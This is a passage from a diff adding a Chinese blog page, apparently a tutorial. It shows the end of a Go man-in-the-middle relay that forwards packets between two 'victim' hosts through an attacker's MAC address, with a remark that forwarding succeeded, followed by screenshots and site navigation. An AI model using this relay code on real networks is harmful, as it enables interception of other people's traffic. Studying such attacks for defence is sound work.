+</span></span><span class="line"><span class="cl">		<span class="nx">ethLayer</span> <span class="o">:=</span> <span class="nx">packet</span><span class="p">.</span><span class="nf">Layer</span><span class="p">(</span><span class="nx">layers</span><span class="p">.</span><span class="nx">LayerTypeEthernet</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">ethLayer</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">continue</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">eth</span> <span class="o">:=</span> <span class="nx">ethLayer</span><span class="p">.(</span><span class="o">*</span><span class="nx">layers</span><span class="p">.</span><span class="nx">Ethernet</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// victim1 -&gt; victim2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="nx">eth</span><span class="p">.</span><span class="nx">SrcMAC</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span> <span class="o">==</span> <span class="nx">t1MAC</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="nx">eth</span><span class="p">.</span><span class="nx">DstMAC</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span> <span class="o">==</span> <span class="nx">attackerMAC</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">relayPacket</span><span class="p">(</span><span class="nx">handle</span><span class="p">,</span> <span class="nx">packet</span><span class="p">,</span> <span class="nx">t2MAC</span><span class="p">,</span> <span class="nx">attackerMAC</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// victim2 -&gt; victim1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="nx">eth</span><span class="p">.</span><span class="nx">SrcMAC</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span> <span class="o">==</span> <span class="nx">t2MAC</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="nx">eth</span><span class="p">.</span><span class="nx">DstMAC</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span> <span class="o">==</span> <span class="nx">attackerMAC</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">relayPacket</span><span class="p">(</span><span class="nx">handle</span><span class="p">,</span> <span class="nx">packet</span><span class="p">,</span> <span class="nx">t1MAC</span><span class="p">,</span> <span class="nx">attackerMAC</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}()</span>
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>结果如下, 成功转发</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516030901.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516030901.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516030906.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516030906.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516030853.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516030853.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+</article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/archlinux%e7%9a%84%e5%ae%89%e8%a3%85%e5%92%8c%e9%85%8d%e7%bd%ae" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">Archlinux的安装和配置</p>
+            </a>
+            
+
+            
+            <a href="/post/kitty" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">kitty</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
